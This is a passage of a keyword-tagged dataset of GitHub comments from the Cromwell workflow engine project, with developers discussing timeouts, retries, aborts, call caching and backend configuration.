cromwell.services.metadata.impl.builder.MetadataBuilderActor.processEvent(MetadataBuilderActor.scala:245); 	at akka.actor.FSM.akka$actor$FSM$$processMsg(FSM.scala:701); 	at akka.actor.FSM$$anonfun$receive$1.apply",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5525#issuecomment-639142073:536,avoid,avoid,536,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5525#issuecomment-639142073,3,"['avoid', 'safe']","['avoid', 'safety']"
Safety,@cpavanrun If this is enabled in the config like this it does retry:; https://cromwell.readthedocs.io/en/develop/RuntimeAttributes/#maxretries. Also the timeout will start counting when isAlive returns false for the first time. After that isAlive will not be called anymore.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4112#issuecomment-425008288:153,timeout,timeout,153,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4112#issuecomment-425008288,1,['timeout'],['timeout']
Safety,"@danbills The Orchestrator pattern as described above is what we discussed. . Per your other questions, the answer is that AWS Batch does not take a array of arbitrary scripts as an option, nor can you override a Docker container's `ENTRY_POINT` to supply your own script if the entry point of the container has been changed from the default shell. You can only specify an array to pass into Docker daemon's `CMD`. Speaking of default shells, the other arguments against a set of shell scripts is that it limits the set of containers that can be called from a WDL. For example, the current Cromwell scripts that are injected into the container assume Bash support, but by default Alpine Linux (and many containers that build off of it) do not have Bash installed. . Most of the time the above two items are safe assumptions, but not always, hence the current plan to implement data staging via a sibling container approach similar to how CI systems are deployed today. For inspiration, I refer to [Dave Hein's excellent article on running sibling containers in lieu of docker-in-docker](https://www.develves.net/blogs/asd/2016-05-27-alternative-to-docker-in-docker/)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3804#issuecomment-400025987:807,safe,safe,807,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3804#issuecomment-400025987,1,['safe'],['safe']
Safety,"@danbills does the following sound accurate to you?. As a **user running workflows on Pipelines API**, I want **Cromwell to notify me when it hits the limit for retries**, so that **I know why my workflow failed**.; * Effort: Small; * Risk: Small; * Business value: Small to Medium",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2426#issuecomment-332648095:235,Risk,Risk,235,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2426#issuecomment-332648095,1,['Risk'],['Risk']
Safety,"@dgtester I wouldn't avoid the scala shutdown hook if it makes sense (making this up as I go, but e.g. sending a message to WorkflowActor which then propagates outward), there've been a handful of things that I've been meaning to add to a hook anyways so there'll be one sooner or later anyways",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/397#issuecomment-174198348:21,avoid,avoid,21,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/397#issuecomment-174198348,1,['avoid'],['avoid']
Safety,@dinvlad In my PR (#5023) the intention was to allow users to be able to interact with BQ from inside their WDL commands. With that in mind I believe what you're suggesting is that nothing untoward would happen unless they did this and their service account didn't have the corresponding permission set. Is that correct?. I still think it's worth testing to be sure but since it looks like we've added scopes before w/o issue I'm less fearful .... but IMO there's still a risk and we should make sure the risk is 0. Denis - it's on my list to poke at this but if you all don't want to wait for me and would like to validate success/failure please feel free to do so,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5028#issuecomment-502247296:472,risk,risk,472,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5028#issuecomment-502247296,2,['risk'],['risk']
Safety,"@dtenenba , @vortexing - The [docs](https://docs.opendata.aws/genomics-workflows) for creating the genomics workflow environment (i.e. AWS Batch and related resources) have been updated. Use of custom AMIs has been deprecated in favor of using EC2 Launch Templates. There's also additional parameter validation under the hood around setting up an environment for Cromwell to avoid these configuration errors.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4563#issuecomment-470339885:375,avoid,avoid,375,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4563#issuecomment-470339885,1,['avoid'],['avoid']
Safety,"@dvoet I'm going through the backlog and I was wondering if you're still seeing this problem. Aborts are a known issue for Cromwell but I wasn't sure if a newer version of Cromwell happened to do this better. If so, I'll close this out, if not I'll keep it around for when we fix aborts.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1885#issuecomment-291888077:94,Abort,Aborts,94,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1885#issuecomment-291888077,2,"['Abort', 'abort']","['Aborts', 'aborts']"
Safety,"@ffinfo my concern was more that the `isAlive` should be opt-in, not that that timeout should be opt in. . if I'm reading this right (EDIT: I think I got it a bit wrong first time):. - The job enters the `Running` state; - The first time we poll for it, we *always* check whether it's alive; - While it still is, we keep running `isAlive` every time we get polled; - Otherwise we enter the `WaitingForReturnCode`; - After the job is no longer alive, we abandon it after a given timeout and declare it failed; - If no timeout is configured, we keep waiting forever. I think this shouldn't be too much of a refactor:. - The job enters the `WaitingForReturnCode` state; - We immediately schedule an `CheckAlive` message to the actor at the configurable time; - If the cadence is not set, we never send that message (this would be the default); - When that CheckAlive arrives we can run `isAlive` and remember the result (and if we're still alive, schedule another `CheckAlive` again after the same delay); - If the `isAlive` failed, the next poll would return `Failed`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4112#issuecomment-423569265:79,timeout,timeout,79,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4112#issuecomment-423569265,3,['timeout'],['timeout']
Safety,"@francares sorry for the slow responses this week. We've got people out this week so we're falling a bit behind on code reviews (also this week was a release week, which has taken up a good amount of my time). I will definitely review again by EOD tomorrow, but I'm not avoiding this! I need to review @kshakir's PR first because I'm way overdue on that one, but this one is next.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/495#issuecomment-191947625:270,avoid,avoiding,270,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/495#issuecomment-191947625,1,['avoid'],['avoiding']
Safety,@freeseek are you reporting a bug in Cromwell's 504 detection and retry logic?. Receiving a 504 error in the first place is a Google problem and we have no control.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5344#issuecomment-760305422:52,detect,detection,52,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5344#issuecomment-760305422,1,['detect'],['detection']
Safety,@gauravs90 at the risk if putting words in his mouth I think he was wondering to what extent this is just moving existing code around vs sweeping changes. IOW is this a 5 min change or a 5 day change?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/401#issuecomment-174085300:18,risk,risk,18,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/401#issuecomment-174085300,1,['risk'],['risk']
Safety,"@genomics-geek Having just spent some time last week on this (also on SGE), I believe you need this:; https://cromwell.readthedocs.io/en/stable/backends/HPC/#exit-code-timeout",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2176#issuecomment-510116881:168,timeout,timeout,168,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2176#issuecomment-510116881,1,['timeout'],['timeout']
Safety,"@genomics-geek Just ran into the same problem here.; ```; Unable to run job: failed receiving gdi request response for mid=1 (got syncron message receive timeout error)..; Exiting.; error: commlib error: got read error (closing ""vm-gridmaster/qmaster/1""); ```; This kind of glitch seems pretty common in SGE, unfortunately - it would be nice to have a workaround.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2176#issuecomment-520629335:154,timeout,timeout,154,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2176#issuecomment-520629335,1,['timeout'],['timeout']
Safety,@geoffjentry @cjllanwarne I removed model package to avoid larger discussions on the topic.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/758#issuecomment-216398775:53,avoid,avoid,53,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/758#issuecomment-216398775,1,['avoid'],['avoid']
Safety,"@geoffjentry I believe that is correct.; Just to get some clarification on this - why does the summary refresh actor need to be disabled to use cromwell as read-only ? I understand that the refresh actor writes to the database, but in very low amounts (1 line per workflow), and its purpose (as I understand it, @mcovarr ?) is to help relieve the metadata endpoint by avoiding recomputing the current status on every call, which would be useful for a read-only cromwell ?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1378#issuecomment-245950069:368,avoid,avoiding,368,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1378#issuecomment-245950069,1,['avoid'],['avoiding']
Safety,"@geoffjentry I think I understand what you mean. From my perspective it's a matter of where to stop.; We could ban entirely `Future`s from the codebase and decide that every asynchronous task deserves its own actor. That seems a bit extreme to me though.; I see your point about future being dangerous inside of actors. However I believe that small actors with 2 states and 3 internal messages are a small enough unit to be understood well enough to avoid the kind of problems we encountered before. This actor doesn't even have state data, there's no state to be shared or mutated.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/818#issuecomment-218578385:450,avoid,avoid,450,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/818#issuecomment-218578385,1,['avoid'],['avoid']
Safety,"@geoffjentry I want to resort to authority and say ""Zen of Akka""... . Reasons for my gut feeling: A mutable val makes it look and act more like a state machine, and reduces the risk of accidentally leaking the variable pointer to other threads which may update it out of band. Obviously not likely in this case, but as a muscle memory thing a-la `Some(constant)`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1044#issuecomment-227570413:177,risk,risk,177,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1044#issuecomment-227570413,1,['risk'],['risk']
Safety,"@geoffjentry Is this at the time of running the workflow, or after the fact (like #1670)?. As a **workflow runner**, I want **to be able to select certain tasks to call cache or not call cache on**, so that I can **avoid reusing bad or old cache results**. ; - Effort: **Small**; - Risk: **Small to Mediume**; - This should not be a runtime attribute; - Make sure users don't overuse this feature and eliminate the benefits of call caching (i.e. clearly state when users should use this); - Business value: **Medium**",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1695#issuecomment-327932586:215,avoid,avoid,215,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1695#issuecomment-327932586,3,"['Risk', 'avoid']","['Risk', 'avoid']"
Safety,@geoffjentry Thanks for the quick response. Goal here is to enable rapid failure detection. I'm very open to different approaches to this!,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3503#issuecomment-380300215:81,detect,detection,81,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3503#issuecomment-380300215,1,['detect'],['detection']
Safety,@geoffjentry The PR is to make it run if execution fails. I didn't want to conflict with Scott's PR so I didn't do the abort case,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/893#issuecomment-222984745:119,abort,abort,119,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/893#issuecomment-222984745,1,['abort'],['abort']
Safety,"@geoffjentry Verbosity is just a small part of that. Making different parts of the code aware of the each other, where avoidable, doesn't seem like a very good idea. If I'm not mistaken, what you're saying (and what I initially implemented) is something like the erstwhile `DataAccess` (which would be the `ServiceRegistoryActor` in the current world). With this, each step (actor) of the workflow had a reference to it and pushed to it independently. Any change to the dataAccess might have required changes to all the classes which were accessing it. Alternatively, if there was just one entity which handled the responsibility of collecting the metadata, by sniffing around the actors without their knowledge, and then pushed to the database, we need only change this entity for any modifications if there were to happen to the data access stuff. I'll try to explain with a very simple (and silly) analogy: (Honestly, couldn't come up with anything better.); Consider a ginormous Octopus (= `ServiceRegistry`) with a black ink on the tips of it's tentacles, with each of it's legs touching upon different rooms (= classes) in a house. If someday we decide to replace that octopus with something else, we'll be needing to wipe that ink from all the rooms upon which it was standing. On the other hand, if it were to sit and cuddle up just in a single room, there's simply less and comparatively easy work to do to wipe that up. It's simply the same idea here. The Metadata producing entities in the engine can just go about minding their own business, while a third party (those classes with some weird names currently [CromwellProfilerFsm and WorkflowProfilerActor]) handle what they are meant to do: Profile a given workflow execution. (all the while without explicitly telling those execution engine entities that it's reading it's state and data information). If the intentions are still not clear, let's talk about it tomorrow in the meeting to make progress with this?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/829#issuecomment-218970121:119,avoid,avoidable,119,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/829#issuecomment-218970121,2,['avoid'],['avoidable']
Safety,@geoffjentry What benefit does the AsyncAppender have for our logs? How realistic is the risk that some messages could be dropped?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1809#issuecomment-329481910:89,risk,risk,89,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1809#issuecomment-329481910,1,['risk'],['risk']
Safety,"@geoffjentry Yeah, I have also hit my share of obscure errors over time in my applications, though by that time the failure-recovery rules usually kicked in to keep the system in a running state, with the periodic subsequent log monitoring and analysis in case certain edge-cases become more prevalent. It is great to hear about the shift towards scaling being explored for the near future, but I think you might have made things unnecessarily hard for yourself. Usually it is much easier to have scaling be built-in from the start into the application, and then tuning through metric-based scaling policies the application-triggered scaling rules, which can be bounded by appropriate upper limits before, or interactively after application deployment. This way one has the benefits of both worlds - controlling costs with scalability capabilities for satisfying possible capacity/performance requirements - but I am sure you are already aware of that as well :)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1665#issuecomment-262130235:124,recover,recovery,124,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1665#issuecomment-262130235,1,['recover'],['recovery']
Safety,@geoffjentry and @cjllanwarne:; Thank you for you response. I do understand your concerns. In the future I we going to move away from traditional HPC systems (i hope). For now we have sadly to deal with them. I already have this config value in place with a default. I can remove this default and using this behaviour when `exit-code-timeout` is set. This easy to do.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4112#issuecomment-423100767:334,timeout,timeout,334,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4112#issuecomment-423100767,1,['timeout'],['timeout']
Safety,"@geoffjentry asked me to clarify, so here I am!. Currently, PAPI doesn't understand FOFN... so they are really just a File that contains strings. Often they are created by taking the file output of a scatter call as an array and writing it to an array like. ```; Array[File] vcfs = PreviousTask.output ...; File fofn = write_lines(vcfs); ```. Then that FOFN is used as the parameter to the task, and used by the tool in the command directly. The only thing that gets localized by PAPI is the FOFN itself. Keep in mind right now that the only scenario where this works is where your docker has access to the file, which on Google means when you're running in service account mode, but hopefully we can overcome that in the future. Just for context, my use case here is more like 'resume' than call caching. I don't expect to find results from some previous/other run of the pipeline. It's really that something broke, I tweaked the WDL, and now want to basically pick up where I left off. That's the specific problem I have (and any methods developer will have with a FOFN step). There are two ways I can think of going about this:. 1. Fix call caching to handle FOFNs specifically. This is tricky I think, but is most robust. In this case, I want Cromwell to understand a File of File references as a specific type but just for call caching purposes. 2. Change call caching to re-use files rather than copying, thus the path of the file doesn't changes, the FOFN doesn't change, and the call cache hits. This is how I ended up working around this by splitting the WDL into pieces where I supply the inputs to avoid the cache-miss step. I believe we have this option in the SFS?. In your proposal @cjllanwarne a FileRef would be hashed like a file for job avoidance, but treated like a string for all other purposes (e.g. passing to PAPI, etc)? I think that could work.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2309#issuecomment-305977901:1609,avoid,avoid,1609,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2309#issuecomment-305977901,4,['avoid'],"['avoid', 'avoidance']"
Safety,"@geoffjentry sounds like the workflow notes would be another endpoint, is that right? If so, what would you say the effort and risk is?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1679#issuecomment-326331514:127,risk,risk,127,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1679#issuecomment-326331514,1,['risk'],['risk']
Safety,"@geoffjentry sounds like this will be necessary in a CaaS world, do you agree?. As a **FC/GOTC developer**, I want **Cromwell to test with Cloud SQL after every release**, so that I can **avoid critical (? @helgridly a bug in Cloud SQL would be critical, right?) regressions and issues in production**.; - Effort: **Medium**; - Risk: **Small**; - Business value: **Medium**",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1726#issuecomment-328536302:188,avoid,avoid,188,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1726#issuecomment-328536302,2,"['Risk', 'avoid']","['Risk', 'avoid']"
Safety,@geoffjentry what do you think the effort would be? Any risks?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1566#issuecomment-326636978:56,risk,risks,56,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1566#issuecomment-326636978,1,['risk'],['risks']
Safety,"@geoffjentry when you have 5 mins, can you sanity check the last 3 commits?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/792#issuecomment-217541408:43,sanity check,sanity check,43,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/792#issuecomment-217541408,1,['sanity check'],['sanity check']
Safety,"@hkeward welcome to our repo and thank you for your contribution. We were actually looking at making this timeout configurable ourselves, so you've done some of our work for us.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5273#issuecomment-555176923:106,timeout,timeout,106,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5273#issuecomment-555176923,1,['timeout'],['timeout']
Safety,"@hmkim ; I continue the break point to run it again, it works now.; What part of process takes long idle time in your instance? what makes the long idle time?; In fact, the pipeline always consists of multiple processes and works on hundreds of samples. ; In case of time, what should i config to avoid this errors not run it again?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4403#issuecomment-439905197:297,avoid,avoid,297,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4403#issuecomment-439905197,1,['avoid'],['avoid']
Safety,@illusional I think that as long as @vsoch and @TMiguelT are :+1: on the current state that we're good to go. I'll wait to hear from them just to be on the safe side.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4635#issuecomment-468378046:156,safe,safe,156,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4635#issuecomment-468378046,1,['safe'],['safe']
Safety,"@jacarey @vivster7 Just as a sanity check, I'm assuming you all actually tested this for realz, right? i.e. not just unit tests? . 👍 . [![Approved with PullApprove](https://img.shields.io/badge/pullapprove-approved-brightgreen.svg)](https://pullapprove.com/broadinstitute/cromwell/pull-request/842/?utm_source=github-pr&utm_medium=comment-badge&utm_campaign=broadinstitute/cromwell)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/842#issuecomment-220619184:29,sanity check,sanity check,29,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/842#issuecomment-220619184,1,['sanity check'],['sanity check']
Safety,"@katevoss Hi Kate. I think there are two aspects to the issue worth considering - the first being how often we hit this problem in practice (I'll get back with you after I ask the production team) and the second being whether the underlying cause has been addressed - which is that relying only on the creation of a file to detect task completion is not robust at least for SGE/PBS type backends where jobs may be killed by the scheduler out-of-process without creating a file. Based only on the release changelog I suspect that the answer to the second is no. I suggest re-using the ""check-alive"" configuration value that's documented as currently used only on cromwell restart, for periodic (but infrequent) polling of the scheduler.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1499#issuecomment-325070557:324,detect,detect,324,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1499#issuecomment-325070557,1,['detect'],['detect']
Safety,"@katevoss I would love to have this functionality. I'm effectively nesting two scatters (by scatter over calls to a subworkflow with a scatter), which returns an Array[Array[File]]. Nothing happens to those Files at the top level, they just get passed up the callstack, so it doesn't matter to me which scatter generated which subset of Files. It would be nice to be able to operate on a flattened Array of Files at the top level to avoid gathering and moving extra data or making the WDL unnecessarily complicated.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2702#issuecomment-369630808:433,avoid,avoid,433,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2702#issuecomment-369630808,1,['avoid'],['avoid']
Safety,"@katevoss IIRC the intended behavior is that submitted files are stored as-is no matter what and then when we pick up the workflow we check to see if everything is valid. However @cjllanwarne noticed that we are actually validating one of the input files at actual submission time which led to two issues: a) there was a reason why we didn't want to do that in the first place, b) there was a suspicion that this could lead to timeouts instead of errors anyways",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1882#issuecomment-328278898:427,timeout,timeouts,427,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1882#issuecomment-328278898,1,['timeout'],['timeouts']
Safety,"@katevoss Sounds good. Recently, abort has generally worked for me. Just not in this case.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2845#issuecomment-344393380:33,abort,abort,33,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2845#issuecomment-344393380,1,['abort'],['abort']
Safety,"@kcibul @ruchim Could you opine (since ""Job Avoidance"" is certainly now available) what kind of behaviour we want if we ""clear up"" a call-cached task?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/601#issuecomment-254317040:44,Avoid,Avoidance,44,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/601#issuecomment-254317040,1,['Avoid'],['Avoidance']
Safety,"@kcibul A few questions about this:; - Should it support in-place DB migration, or DB A to DB B, or both ?; - Is it a separate program that runs independently ? If yes does it still live in the Cromwell repo ? Or a new flag in cromwell (like server, run, migration), ? Is there any ""automagic"" detection that my DB needs an update when I run cromwell 0.20 on a pre-0.20 DB ?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/789#issuecomment-226247983:294,detect,detection,294,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/789#issuecomment-226247983,1,['detect'],['detection']
Safety,"@kcibul From what I understand, it is still a frequent problem that P.API does not abort workflows even though Cromwell asked. . @geoffjentry do you have an idea about the effort involved to make this fix? . @abaumann Do we have any data (from FC) with how often this is happening?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1139#issuecomment-323855111:83,abort,abort,83,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1139#issuecomment-323855111,1,['abort'],['abort']
Safety,@kcibul This problem doesn't exist in develop (that I can see) as we're not currently supporting restart/recover,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/999#issuecomment-225944359:105,recover,recover,105,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/999#issuecomment-225944359,1,['recover'],['recover']
Safety,"@kshakir As per my understanding, `eventually` was the one that was timing out. When I tested it last week with several builds, the test did not fail in any of them. And I had observed that when I decreased the span scale factor, it started failing again. Maybe there are other timeouts failing the test as well. I will try and add println-debugging.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4261#issuecomment-430417752:278,timeout,timeouts,278,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4261#issuecomment-430417752,1,['timeout'],['timeouts']
Safety,"@kshakir commented on [Mon Jan 23 2017](https://github.com/broadinstitute/centaur/issues/134). For each test name, it would be helpful to log the workflowId, as the name of the WDL workflow doesn't always match the name of the test. Additionally, a brief message of when the test was detected as starting & stopped would help debug stuck workflows. If this is deemed too verbose, the above could be logged at level debug.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2891:284,detect,detected,284,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2891,1,['detect'],['detected']
Safety,"@kshakir exporting the factor (to `sbt`) does actually scale the timeout. I ran the test couple of times, and it hasn't failed so far. And upon adding println-debugging I did see the timeout being scaled by 10.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4261#issuecomment-430822659:65,timeout,timeout,65,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4261#issuecomment-430822659,2,['timeout'],['timeout']
Safety,@kshakir is there a configurable timeout for job completion in the SFS backends?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4050#issuecomment-417333069:33,timeout,timeout,33,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4050#issuecomment-417333069,1,['timeout'],['timeout']
Safety,@kshakir would it change your mind about the Centaur test to know the cases in `WomTypeSpec.scala` successfully detect the issue at a unit level?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4324#issuecomment-433928082:112,detect,detect,112,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4324#issuecomment-433928082,1,['detect'],['detect']
Safety,"@ktibbett is this still a feature that would help the production pipeline? ; @geoffjentry aside from the risk of duplicate naming for output and logs, are there any other risks involved? What would be the effort?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1641#issuecomment-325671959:105,risk,risk,105,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1641#issuecomment-325671959,2,['risk'],"['risk', 'risks']"
Safety,"@ldgauthier and @Leetl1220 do you know how many users use Cromwell with SGE?. As a **SGE user**, I want to **the SGE config to be tested in Centaur**, so that I can **avoid regressions**.; - Effort: **Medium to Large**; - Risk: **Small**; - Business value: **Medium**",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1180#issuecomment-324443806:167,avoid,avoid,167,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1180#issuecomment-324443806,2,"['Risk', 'avoid']","['Risk', 'avoid']"
Safety,"@mcovarr @aednichols you both asked the same question from different directions... I'll try to answer both in one go:. * This *does not* alter how the class operates in production because it's a `None foreach { ... }`.; * I override the `None` in the spec so that I can guarantee the events land as a unit and aren't interrupted by the occasional flushing action. FWIW I did try to move *all* of this logic into the test class to avoid cluttering the main, but got tangled up trying to override the FSM actions with a `receive` in the test class and it ended up not working as I'd hoped.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4898#issuecomment-486854451:430,avoid,avoid,430,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4898#issuecomment-486854451,1,['avoid'],['avoid']
Safety,"@mcovarr @geoffjentry Like I mentioned at standup I added a second commit after seeing a failure in centaur.; What happened was JES failed the job because it couldn't localize the auth file (not found).; However I didn't see anything in Cromwell suggesting that the upload failed (which we log if it happens). So my guess is JES tried to localize the file when Cromwell was restarting the workflow and hence re-writing the file, which made sense according to the timestamps at least. This commit makes the upload of the auth file fail if the file already exists, unless it's a known restart in which case it ignores the failure and keeps going. I think it makes sense to fail the workflow if there's already an auth file for this workflow and it's the *first* time we run it. It might indicate something is wrong and failing the workflow avoids taking chances with refresh tokens / secrets. If you disagree please voice your concerns :)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2490#issuecomment-319093447:838,avoid,avoids,838,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2490#issuecomment-319093447,1,['avoid'],['avoids']
Safety,"@mcovarr I agree (although that day might be sooner than you think, re WDLd3)... read my pluggable comment only as ""this is background info on why I don't want another function if we can avoid it""",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2988#issuecomment-349346941:187,avoid,avoid,187,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2988#issuecomment-349346941,1,['avoid'],['avoid']
